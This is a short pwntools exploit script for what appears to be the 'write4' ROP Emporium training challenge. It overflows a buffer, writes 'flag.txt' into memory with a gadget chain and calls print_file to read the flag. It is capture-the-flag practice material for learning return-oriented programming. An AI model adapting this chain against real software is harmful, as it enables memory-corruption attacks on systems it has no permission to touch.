#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64', os='linux')
exe = './write4'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

ret             = p64(0x00000000004004e6)
pop_rdi         = p64(0x0000000000400693)
pop_r15         = p64(0x0000000000400692)
pop_r14_pop_r15 = p64(0x0000000000400690)
mov_r14_r15     = p64(0x0000000000400628)
print_file      = p64(0x0000000000400510)
write_to        = p64(0x0000000000601038)



payload = b'A'*40 \
        + pop_r14_pop_r15 \
        + write_to \
        + b'flag.txt' \
        + mov_r14_r15 \
        + pop_rdi \
        + write_to \
        + ret \
        + print_file

io.sendline(payload)

io.interactive()

